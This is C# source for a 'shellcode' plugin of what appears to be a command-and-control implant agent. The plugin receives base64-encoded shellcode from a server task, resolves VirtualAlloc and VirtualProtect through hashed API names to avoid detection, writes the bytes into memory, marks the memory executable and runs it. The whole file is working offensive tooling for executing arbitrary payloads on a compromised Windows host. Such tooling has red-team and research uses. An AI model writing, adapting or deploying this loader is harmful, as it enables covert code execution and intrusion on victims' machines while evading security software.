using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Linq;
using System.Net.NetworkInformation;
using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Text.Json;
using Invoker.Dynamic;
using System;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "shellcode";
        private delegate void BufferDelegate();
        private enum MemoryProtection : UInt32
        {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }
        private delegate bool VPDelegate(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        private delegate IntPtr VADelegate(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }
        private string output_task_id { get; set; }
        private bool resolved = false;
        private long key = 0x617468656E61;
        private IntPtr vpFunc = IntPtr.Zero;
        private IntPtr vaFunc = IntPtr.Zero;
        Dictionary<string, string> map = new Dictionary<string, string>()
        {
            { "k32","A63CBAF3BECF39638EEBC81A422A5D00" },
            { "va", "099F8A295CEEBF8CA978C7F2D3C29C65" },
            { "vp", "784C68EEDB2E6D5931063D5348864AAD" }
        };
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
        }
        private bool Resolve()
        {
            var k32Mod = Generic.GetLoadedModulePtr(map["k32"], key);
           
            if(k32Mod == IntPtr.Zero)
            {
                return resolved;
            }

            vpFunc = Generic.GetExportAddr(k32Mod, map["vp"], key);
            vaFunc = Generic.GetExportAddr(k32Mod, map["va"], key);

            if(vaFunc != IntPtr.Zero && vpFunc != IntPtr.Zero)
            {
                resolved = true;
            }

            return resolved;
        }
        public async Task Execute(ServerJob job)
        {

            if (!resolved)
            {
                if (!this.Resolve())
                {
                    await messageManager.AddResponse(new ResponseResult()
                    {
                        completed = true,
                        user_output = "Failed to resolve functions",
                        task_id = job.task.id,
                        status = "success"
                    });
                    return;
                }
            }

            ShellcodeArgs args = JsonSerializer.Deserialize<ShellcodeArgs>(job.task.parameters);

            if (!args.Validate())
            {
                await messageManager.AddResponse(new ResponseResult()
                {
                    completed = true,
                    user_output = "Missing Shellcode Bytes",
                    task_id = job.task.id,
                    status = "success"
                });
                return;
            }

            byte[] buffer = Convert.FromBase64String(args.asm);

            //Allocate shellcode as RW
            object[] vaParams = new object[] { IntPtr.Zero, (uint)buffer.Length, 0x1000, 0x04 };
            IntPtr bufAddr = Generic.InvokeFunc<IntPtr>(vaFunc, typeof(VADelegate), ref vaParams);


            //IntPtr bufAddr = Native.VirtualAlloc(IntPtr.Zero, (uint)buffer.Length, 0x1000, 0x04);
            if (bufAddr == IntPtr.Zero)
            {
                await messageManager.AddResponse(new ResponseResult()
                {
                    completed = true,
                    user_output = $"err VirtualAlloc ({Marshal.GetLastPInvokeError()})",
                    task_id = job.task.id,
                    status = "success"
                });
                return;
            }

            Marshal.Copy(buffer, 0, bufAddr, buffer.Length);

            uint oldProtect = 0;

            object[] vpParams = new object[] { bufAddr, (uint)buffer.Length, 0x20, oldProtect };

            bool result = Generic.InvokeFunc<bool>(vpFunc, typeof(VPDelegate), ref vpParams);

            if (!result)
            {
                await messageManager.AddResponse(new ResponseResult()
                {
                    completed = true,
                    user_output = $"err VirtualProtect ({Marshal.GetLastPInvokeError()})",
                    task_id = job.task.id,
                    status = "success"
                });
                return;
            }

            // Create a delegate to the shellcode
            BufferDelegate shellcodeDelegate = (BufferDelegate)Marshal.GetDelegateForFunctionPointer(bufAddr, typeof(BufferDelegate));
            try
            {
                shellcodeDelegate.Invoke();
            }
            catch
            {
                await messageManager.AddResponse(new ResponseResult()
                {
                    completed = false,
                    process_response = new Dictionary<string, string> { { "message", "0x44" } },
                    task_id = job.task.id,
                    status = "error"
                });
            }
        }
    }
}